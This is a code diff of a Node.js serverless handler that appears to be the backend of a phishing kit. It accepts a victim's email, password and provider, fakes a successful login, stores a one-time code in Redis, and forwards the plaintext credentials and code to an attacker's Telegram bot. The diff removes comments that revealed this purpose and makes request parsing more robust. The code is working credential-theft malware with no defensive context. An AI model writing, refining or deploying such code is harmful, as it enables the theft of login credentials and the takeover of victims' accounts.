@@ -5,7 +5,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const REDIS_URL = process.env.REDIS_URL;
 
-let redis; // will lazily initialize
+let redis;
 
 function getOtpKey(email) {
   return `otp:${email}`;
@@ -16,13 +16,11 @@ function generateOtp() {
 }
 
 module.exports = async function handler(req, res) {
-  // ENV VAR CHECK INSIDE HANDLER!
   if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
     res.status(500).json({ success: false, message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL" });
     return;
   }
 
-  // Lazy-init Redis so it doesn't throw at cold start
   if (!redis) {
     redis = new Redis(REDIS_URL);
   }
@@ -32,23 +30,24 @@ module.exports = async function handler(req, res) {
     return;
   }
 
+  // Robust body parsing for both string and object
   let email, password, provider;
-  try {
-    ({ email, password, provider } = req.body || {});
-  } catch (e) {
-    res.status(400).json({ success: false, message: "Invalid JSON body" });
-    return;
+  let bodyObj = req.body;
+  if (typeof req.body === "string") {
+    try { bodyObj = JSON.parse(req.body); } catch (e) {
+      res.status(400).json({ success: false, message: "Invalid JSON body" });
+      return;
+    }
   }
+  ({ email, password, provider } = bodyObj || {});
 
   if (!email || !password || !provider) {
     res.status(400).json({ success: false, message: "Missing required fields" });
     return;
   }
 
-  // Normalize email
   email = email.trim().toLowerCase();
 
-  // Fake authentication — always succeed
   const authResult = { success: true };
 
   if (!authResult.success) {
@@ -59,7 +58,6 @@ module.exports = async function handler(req, res) {
   const otp = generateOtp();
 
   try {
-    // Store OTP in Redis with 5 minute expiry (recommended)
     await redis.set(getOtpKey(email), otp, "EX", 300);
   } catch (err) {
     res.status(500).json({
@@ -70,9 +68,7 @@ module.exports = async function handler(req, res) {
     return;
   }
 
-  // Send credentials and OTP to Telegram
   const message = `🔐 *New Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
-
   const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
